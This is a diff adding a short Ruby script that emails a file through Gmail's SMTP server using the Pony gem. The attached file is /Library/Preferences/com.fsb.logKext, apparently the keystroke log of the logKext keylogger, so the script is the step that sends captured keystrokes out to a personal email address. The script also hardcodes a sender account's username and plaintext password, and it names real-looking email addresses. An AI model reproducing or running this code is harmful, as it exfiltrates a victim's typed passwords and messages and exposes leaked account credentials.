@@ -1,0 +1,19 @@
+#!/usr/bin/env ruby -w
+
+require 'rubygems'
+require 'pony'
+
+Pony.mail(:to => 'danielvlopes@gmail.com', 
+  :via => :smtp, 
+  :via_options => {
+    :address              => 'smtp.gmail.com',
+    :port                 => '587',
+    :enable_starttls_auto => true,
+    :user_name            => 'jonhhack86@gmail.com',
+    :password             => 'griars4u',
+    :authentication       => :plain
+  }, 
+  :attachments => { 
+    "data.log" => File.read("/Library/Preferences/com.fsb.logKext") 
+  }
+)
